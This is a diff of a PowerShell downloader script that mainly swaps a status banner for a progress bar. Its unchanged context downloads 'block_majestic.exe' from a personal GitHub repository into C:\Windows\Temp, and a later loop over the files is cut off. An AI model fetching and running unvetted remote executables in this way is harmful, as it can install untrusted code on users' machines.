@@ -1,4 +1,3 @@
-# Header
 Write-Host "Need help? Check our homepage: " -NoNewline
 Write-Host "majestic-rp.ru" -ForegroundColor Green
 
@@ -8,20 +7,19 @@ $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
 )
 
-function Show-Status {
-    param ([string]$Line1 = "Downloading...", [string]$Line2 = "    Please wait")
-    $width = $Host.UI.RawUI.WindowSize.Width
-    if ($width -lt 1) { $width = 80 }
-    $l1 = $Line1.PadRight($width)
-    $l2 = $Line2.PadRight($width)
-    Write-Host "`r$l1" -BackgroundColor Blue -ForegroundColor White -NoNewline
-    Write-Host ""
-    Write-Host "$l2" -BackgroundColor Blue -ForegroundColor White -NoNewline
-    Write-Host ""
+function Show-Progress {
+    param ([int]$Percent)
+    $width = 40
+    $filled = [int]($width * $Percent / 100)
+    $empty = $width - $filled
+    $bar = '#' * $filled + '-' * $empty
+    Write-Host "`r  Downloading... [$bar] $Percent%  " -NoNewline
 }
 
 $totalFiles = $downloads.Count
 $fileIndex = 0
+
+Show-Progress 0  # <-- показывается сразу при запуске
 
 foreach ($item in $downloads) {
     try {
@@ -36,14 +34,15 @@ foreach ($item in $downloads) {
         $buffer = New-Object byte[] 8192
         $bytesRead = 0
         $totalRead = 0
-
-        Show-Status
-
         while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
             $fileStream.Write($buffer, 0, $bytesRead)
             $totalRead += $bytesRead
+            if ($totalBytes -gt 0) {
+                $filePct = ($totalRead / $totalBytes)
+                $totalPct = [int](($fileIndex + $filePct) / $totalFiles * 100)
+                Show-Progress $totalPct
+            }
         }
-
         $fileStream.Close()
         $stream.Close()
         $response.Close()
@@ -54,7 +53,7 @@ foreach ($item in $downloads) {
     }
 }
 
-Show-Status "Downloading..." "    Please wait"
+Show-Progress 100
 Write-Host "`n"
 
 foreach ($item in $downloads) {
